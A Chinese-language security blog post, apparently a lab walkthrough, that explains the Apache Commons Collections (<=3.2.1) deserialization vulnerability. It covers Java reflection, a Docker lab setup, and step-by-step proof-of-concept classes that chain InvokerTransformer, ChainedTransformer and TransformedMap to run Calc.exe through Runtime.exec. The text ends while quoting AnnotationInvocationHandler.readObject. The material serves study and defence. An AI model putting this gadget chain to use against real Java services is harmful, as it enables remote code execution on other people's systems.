@@ -1,0 +1,1629 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Apache_Commons_Collections反序列化漏洞, Made by jcxj">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Apache_Commons_Collections反序列化漏洞 | Made by jcxj</title>
+    <link rel="icon" type="image/png" href="/jcxj/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/my.css">
+
+    <script src="/jcxj/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/jcxj/" class="waves-effect waves-light">
+                    
+                    <img src="/jcxj/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Made by jcxj</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/jcxj/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Made by jcxj</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Apache_Commons_Collections反序列化漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/jcxj/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/jcxj/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">反序列化</span>
+                            </a>
+                        
+                            <a href="/jcxj/tags/Apache%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">Apache反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-09-30
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-10-02
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    15 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/jcxj/libs/prism/prism.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="漏洞爆出"><a href="#漏洞爆出" class="headerlink" title="漏洞爆出"></a>漏洞爆出</h1><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930213139132.png" class="" title="image-20220930213139132">
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930213337781.png" class="" title="image-20220930213337781">
+
+<h2 id="docker复现"><a href="#docker复现" class="headerlink" title="docker复现"></a>docker复现</h2><pre class="line-numbers language-none"><code class="language-none">docker pull 296645429&#x2F;apache-commons-collections-vulnerability-ubuntu:v1
+docker network create --subnet&#x3D;192.168.10.1&#x2F;24 testnet
+docker run -p 8088:8088 -p 8081:8081 -it --name testt3 --hostname testt3 --network testnet --ip 10.10.10.100 ubuntuxxx:xxx &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在容器【Apache-Commons-Collections】中，执行命令【java -jar commons-collections-3.1.jar】，则生成文件【CommonsCollections3.1】</p>
+<h2 id="涉及的知识点"><a href="#涉及的知识点" class="headerlink" title="涉及的知识点"></a>涉及的知识点</h2><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930213624092.png" class="" title="image-20220930213624092">
+
+<h3 id="1-Apache-Commons-Collections介绍"><a href="#1-Apache-Commons-Collections介绍" class="headerlink" title="1.Apache Commons Collections介绍"></a>1.Apache Commons Collections介绍</h3><p>Commons Collections介绍:</p>
+<p><strong>java集合类型(容器类型)：List,Map,Set</strong></p>
+<img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930214213000.png" class="" title="image-20220930214213000">
+
+<p>apache在java的基础上拓展了一些容器类型</p>
+<img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930214431455.png" class="" title="image-20220930214431455">
+
+<p>如何使用apache拓展包：引入一个依赖</p>
+<img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930214651957.png" class="" title="image-20220930214651957">
+
+<p>本次漏洞主要搞清楚两个点</p>
+<img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20220930214721636.png" class="" title="image-20220930214721636">
+
+<h2 id="2-java反射机制"><a href="#2-java反射机制" class="headerlink" title="2.java反射机制"></a>2.java反射机制</h2><h3 id="1-jvm"><a href="#1-jvm" class="headerlink" title="(1).jvm"></a>(1).jvm</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002081400726.png" class="" title="image-20221002081400726">
+
+<p>不同的平台有不同的jvm解释器，因此java可以跨平台</p>
+<h3 id="2-反射特性"><a href="#2-反射特性" class="headerlink" title="(2)反射特性"></a>(2)反射特性</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002082031977.png" class="" title="image-20221002082031977">
+
+<p>直接在源码中用new创建一个关键字-&gt;静态的创建，每次运行都会创建</p>
+<p>在程序运行的时候创建-&gt;动态创建</p>
+<p>案例</p>
+<pre class="line-numbers language-none"><code class="language-none">public class Reflect &#123;
+    public static void main(String[] args) throws IOException &#123;
+        test2();
+
+    &#125;
+&#x2F;&#x2F;test1是静态创建
+    public static void test1() throws IOException &#123;
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+&#x2F;&#x2F;test2是动态创建的
+    public static void test2()&#123;
+        try &#123;
+            &#x2F;&#x2F;初始化Runtime类
+            Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);
+            &#x2F;&#x2F; 调用Runtime类中的getRuntime方法得到Runtime类的对象
+            Object rt &#x3D; clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);
+            &#x2F;&#x2F;再次使用invoke调用Runtime类中的方法时，传递我们获得的对象，这样就可以调用
+            clazz.getMethod(&quot;exec&quot;,String.class).invoke(rt,&quot;calc&quot;);
+        &#125;catch (Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="三-Apache-Commons-Collections漏洞原理"><a href="#三-Apache-Commons-Collections漏洞原理" class="headerlink" title="三.Apache Commons Collections漏洞原理"></a>三.Apache Commons Collections漏洞原理</h2><p>影响的版本 ： &lt;=3.2.1</p>
+<h3 id="CC漏洞"><a href="#CC漏洞" class="headerlink" title="CC漏洞"></a>CC漏洞</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002082715547.png" class="" title="image-20221002082715547">
+
+<h3 id="CC关键类"><a href="#CC关键类" class="headerlink" title="CC关键类"></a>CC关键类</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002082738130.png" class="" title="image-20221002082738130">
+
+<h3 id="调用链路"><a href="#调用链路" class="headerlink" title="调用链路"></a>调用链路</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002085805764.png" class="" title="image-20221002085805764">
+
+<h3 id="POC构造思路"><a href="#POC构造思路" class="headerlink" title="POC构造思路"></a>POC构造思路</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002090040182.png" class="" title="image-20221002090040182">
+
+<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002094644625.png" class="" title="image-20221002094644625">
+
+<h2 id="四-漏洞复现"><a href="#四-漏洞复现" class="headerlink" title="四.漏洞复现"></a>四.漏洞复现</h2><h3 id="文件结构："><a href="#文件结构：" class="headerlink" title="文件结构："></a>文件结构：</h3><pre class="line-numbers language-none"><code class="language-none">Poc
+TransTest1
+TransTest2
+TransTest3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="1-先看TransTest1源码"><a href="#1-先看TransTest1源码" class="headerlink" title="1.先看TransTest1源码"></a>1.先看TransTest1源码</h3><p>,了解下InvokerTransformer类怎么利用反射机制来创建类的实例</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.wuya.apache;
+
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+&#x2F;**
+ * InvokerTransformer反射触发
+ *&#x2F;
+public class TransTest1 &#123;
+    public static void main(String[] args)  &#123;
+    	&#x2F;&#x2F;(1)
+        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(
+                &quot;exec&quot;,
+                new Class[]&#123;String.class&#125;,
+                new String[]&#123;&quot;Calc.exe&quot;&#125;
+        );
+
+        try &#123;
+
+            Object input &#x3D; Runtime.getRuntime();&#x2F;&#x2F;(2)
+
+            invokerTransformer.transform(input);&#x2F;&#x2F;(3)
+        &#125;catch (Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="TransTest1源码分析"><a href="#TransTest1源码分析" class="headerlink" title="TransTest1源码分析"></a>TransTest1源码分析</h3><pre class="line-numbers language-none"><code class="language-none">(1)创建了一个InvokerTransformer对象,其构造函数为
+public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+    this.iMethodName &#x3D; methodName;
+    this.iParamTypes &#x3D; paramTypes;
+    this.iArgs &#x3D; args;
+&#125;
+大概的意思是说利用exec方法来执行Calc.exe
+(2)Runtime.getRuntime()    可以取得当前JVM的运行时环境，为后续调用exec方法做准备。
+(3)调用了invokerTransformer.transform的方法，参数为input，也就是Runtime.getRuntime()，其源码为
+public Object transform(Object input) &#123;
+if (input &#x3D;&#x3D; null) &#123;
+return null;
+&#125; else &#123;
+try &#123;
+Class cls &#x3D; input.getClass(); 
+&#x2F;*getClass()返回使用者的类,在这里是class java.lang.Runtime,下面是其他类的返回数据
+object类就返回 class java.lang.Object,
+string类就返回 class java.lang.String
+*&#x2F;
+
+Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);
+&#x2F;*反射机制,比静态创建更加灵活,不再局限于某个类
+这一句调用了类中的某个方法,两个参数都是我们提前传进去的分别为
+exec,String.class
+第一个参数控制方法名,第二个参数控制类名
+*&#x2F;
+
+return method.invoke(input, this.iArgs);
+&#x2F;*
+method.invoke(Object obj,Object args[])的作用就是调用method类代表的方法，其中obj是对象名，args是传入method方法的参数
+在这里是执行了runtime类下的exec方法,参数为calc.exe
+exec(String command)作用：在一个单独的进程中执行指定的命令。
+*&#x2F;
+
+&#x2F;&#x2F;下面的报错可以不管
+&#125; catch (NoSuchMethodException var5) &#123;
+throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
+
+&#125; catch (IllegalAccessException var6) &#123;
+throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
+
+&#125; catch (InvocationTargetException var7) &#123;
+throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);
+
+&#125;
+&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>TransTest1说明了只要我们找到InvokerTransformer类并且能控制其参数，就会导致命令执行漏洞</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">利用：提前配置好invokerTransformer，然后传入Runtime.getRuntime()实例后
+&#x2F;&#x2F;也就是invokerTransformer.transform(Runtime.getRuntime());即可触发命令执行
+InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(
+                &quot;exec&quot;, &#x2F;&#x2F;方法名
+                new Class[]&#123;String.class&#125;,  &#x2F;&#x2F;参数所属的类,也就是&quot;Calc.exe&quot;的类
+                new String[]&#123;&quot;Calc.exe&quot;&#125;  &#x2F;&#x2F;方法的参数名
+        );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-TransTest2源码"><a href="#2-TransTest2源码" class="headerlink" title="2.TransTest2源码"></a>2.TransTest2源码</h3><p>TransTest2解决了如何找到符合要求的 InvokerTransformer类，并给他传入Runtime.getRuntime()实例</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.wuya.apache;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+&#x2F;**
+ * ChainedTransformer遍历触发
+ *
+ *   等同于 ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);
+ *
+ *&#x2F;
+public class TransTest2 &#123;
+    public static void main(String[] args) &#123;
+    	(1)
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                &#x2F;&#x2F; 获得Runtime类对象
+                new ConstantTransformer(Runtime.class),
+                &#x2F;&#x2F; 传入Runtime类对象 反射执行getMethod获得getRuntime方法
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]&#123;String.class,Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;
+                ),
+                &#x2F;&#x2F; 传入getRuntime方法 反射执行invoke方法 得到Runtime实例
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[] &#123;Object.class, Object[].class &#125;,
+                        new Object[] &#123;null, null &#125;
+                ),
+                &#x2F;&#x2F; 传入Runtime实例 执行exec方法
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123;String.class &#125;,
+                        new Object[] &#123;&quot;Calc.exe&quot;&#125;)
+        &#125;;
+
+        &#x2F;&#x2F; ChainedTransformer
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+        chainedTransformer.transform(null);
+    &#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>难点在于反射机制</p>
+<pre class="line-numbers language-none"><code class="language-none">为了看明白这个数组在干什么,需要先去看ChainedTransformer的构造函数和transform方法
+(1)ChainedTransformer的构造函数:单纯的初始化了变量,没什么好分析
+public ChainedTransformer(Transformer[] transformers) &#123;
+        this.iTransformers &#x3D; transformers;
+    &#125;
+(2)transform方法
+public Object transform(Object object) &#123;
+        for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;
+            object &#x3D; this.iTransformers[i].transform(object);
+        &#125;
+
+        return object;
+    &#125;
+&#x2F;*for循环中每次的object都不同,
+第一次是 new ConstantTransformer(Runtime.class), 获得Runtime类对象
+第二次是 传入Runtime类对象 反射执行getMethod获得getRuntime方法
+&#x2F;getMethods()：获得类的public类型的方法。
+第三次   传入getRuntime方法 反射执行invoke方法 得到Runtime实例
+第四次是 传入Runtime实例 执行exec方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>TransTest2说明了找到可控的chainedTransformer,并且这个类将调用其transform方法</p>
+<pre class="line-numbers language-none"><code class="language-none">ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+chainedTransformer.transform(null);
+并且transformers是可控的，就可导致命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="看TransTest3的源码"><a href="#看TransTest3的源码" class="headerlink" title="看TransTest3的源码"></a>看TransTest3的源码</h3><pre class="line-numbers language-none"><code class="language-none">package com.wuya.apache;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.util.HashMap;
+import java.util.Map;
+
+&#x2F;**
+ * 封装为TransformedMap
+ *&#x2F;
+public class TransTest3 &#123;
+    public static void main(String[] args) &#123;
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                &#x2F;&#x2F; 获得Runtime类对象
+                new ConstantTransformer(Runtime.class),
+                &#x2F;&#x2F; 传入Runtime类对象 反射执行getMethod获得getRuntime方法
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]&#123;String.class,Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;,null&#125;
+                ),
+                &#x2F;&#x2F; 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[] &#123;Object.class, Object[].class &#125;,
+                        new Object[] &#123;null, null &#125;
+                ),
+                &#x2F;&#x2F; 传入Runtime实例 执行exec方法
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123;String.class &#125;,
+                        new Object[] &#123;&quot;Calc.exe&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+
+        Map innermap &#x3D; new HashMap();
+        innermap.put(&quot;value&quot;,&quot;value&quot;);
+        Map outermap &#x3D; TransformedMap.decorate(innermap,null,chainedTransformer);
+        &#x2F;&#x2F;这里的decorate起到赋值作用，也就是为了自动调用setValue()
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="TransTest3源码分析"><a href="#TransTest3源码分析" class="headerlink" title="TransTest3源码分析"></a>TransTest3源码分析</h3><p>关键在于 当map中的元素进行增加,删除,修改时，会自动调用setValue()方法</p>
+<pre class="line-numbers language-none"><code class="language-none">相比与TransTest2，TransTest3多了一个map功能
+Map innermap &#x3D; new HashMap();
+innermap.put(&quot;value&quot;,&quot;value&quot;);
+Map outermap &#x3D; TransformedMap.decorate(innermap,null,chainedTransformer);
+当map中的元素进行增加,删除,修改时，会自动调用setValue()方法
+public Object setValue(Object value) &#123;
+value &#x3D; this.parent.checkSetValue(value);
+return super.entry.setValue(value);
+&#125;
+setVelue中会调用checkSetValue()
+protected Object checkSetValue(Object value) &#123;
+        return this.valueTransformer.transform(value);
+    &#125;
+而checkSetValue()会执行valueTransformer.transform(value);
+这里就和TransTest2联系起来了。
+因为valueTransformer是ChainedTransformer(transformers);数组，而ChainedTransformer.transformer()方法就是遍历数组中每个元素的tansformer方法
+在数组中
+第一个valueTransformer返回Runtime类，第二个valueTransformer获得Runtime.getRuntime(),第三个valueTransformer触发实例，第四个valueTransformer执行代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="第四步：怎么找一个类，当他反序列化的时候会调用map的setValue"><a href="#第四步：怎么找一个类，当他反序列化的时候会调用map的setValue" class="headerlink" title="第四步：怎么找一个类，当他反序列化的时候会调用map的setValue?"></a>第四步：怎么找一个类，当他反序列化的时候会调用map的setValue?</h3><p>已经找到了：AnnotationInvocationHandler</p>
+<p>下面是这个类的readObject()方法    (readObject()用于反序列化)</p>
+<p>即使看不懂，也可以发现，这里面跟map有联系，而跟map有联系又会调用map的setValue()………就和TransTest3联系起来了</p>
+<pre class="line-numbers language-none"><code class="language-none">private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException &#123;
+        ObjectInputStream.GetField fields &#x3D; s.readFields();
+
+        @SuppressWarnings(&quot;unchecked&quot;)
+        Class&lt;? extends Annotation&gt; t &#x3D; (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);
+        @SuppressWarnings(&quot;unchecked&quot;)
+        Map&lt;String, Object&gt; streamVals &#x3D; (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);
+
+        &#x2F;&#x2F; Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType &#x3D; null;
+        try &#123;
+            annotationType &#x3D; AnnotationType.getInstance(t);
+        &#125; catch(IllegalArgumentException e) &#123;
+            &#x2F;&#x2F; Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        &#125;
+
+        Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();
+        &#x2F;&#x2F; consistent with runtime Map type
+        Map&lt;String, Object&gt; mv &#x3D; new LinkedHashMap&lt;&gt;();
+
+        &#x2F;&#x2F; If there are annotation members without values, that
+        &#x2F;&#x2F; situation is handled by the invoke method.
+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;
+            String name &#x3D; memberValue.getKey();
+            Object value &#x3D; null;
+            Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);
+            if (memberType !&#x3D; null) &#123;  &#x2F;&#x2F; i.e. member still exists
+                value &#x3D; memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
+                      value instanceof ExceptionProxy)) &#123;
+                    value &#x3D; new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
+                                annotationType.members().get(name));
+                &#125;
+            &#125;
+            mv.put(name, value);
